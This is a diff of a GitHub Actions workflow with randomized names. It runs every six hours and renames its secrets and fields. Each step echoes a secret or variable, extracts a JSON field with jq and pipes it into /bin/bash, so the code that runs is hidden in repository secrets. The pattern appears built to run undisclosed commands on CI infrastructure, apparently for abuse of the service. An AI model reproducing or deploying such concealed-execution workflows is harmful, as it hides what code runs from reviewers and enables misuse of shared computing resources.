@@ -3,24 +3,25 @@ name: wanghuaijue7654
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 2/6 * * *'
+    - cron: '39 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wanghuaijue7654
         env:
-          ygbg89556: ${{ secrets.ygbg89556 }}
+          ymk04: ${{ secrets.ymk04 }}
         run: |
-          echo $ygbg89556 | jq -r .uszfk541 | /bin/bash
-          echo $v873 | jq -r .y0 | /bin/bash
-          echo $ybe8506 | jq -r .wa8 | /bin/bash
-          echo $pnmw00497 | jq -r .wk49 | /bin/bash
-          echo $aa88 | jq -r .it9 | /bin/bash
-          echo $f4490 | jq -r .xepn72560 | /bin/bash
-          echo $zzbj90 | jq -r .fymz13 | /bin/bash
-          echo $z8119 | jq -r .nx106 | /bin/bash
-          echo $vasg64 | jq -r .anldx43 | /bin/bash
+          echo $ymk04 | jq -r .o0608 | /bin/bash
+          echo $uskd689 | jq -r .voxos01 | /bin/bash
+          echo $yt64835 | jq -r .ixp43741 | /bin/bash
+          echo $q5388 | jq -r .lcahn178 | /bin/bash
+          echo $xyu84 | jq -r .f95873 | /bin/bash
+          echo $jwto67077 | jq -r .fl53686 | /bin/bash
+          echo $mfx87 | jq -r .nzibc05797 | /bin/bash
+          echo $xpfko7039 | jq -r .yv4270 | /bin/bash
+          echo $hfsak413 | jq -r .mqaxw47662 | /bin/bash
 
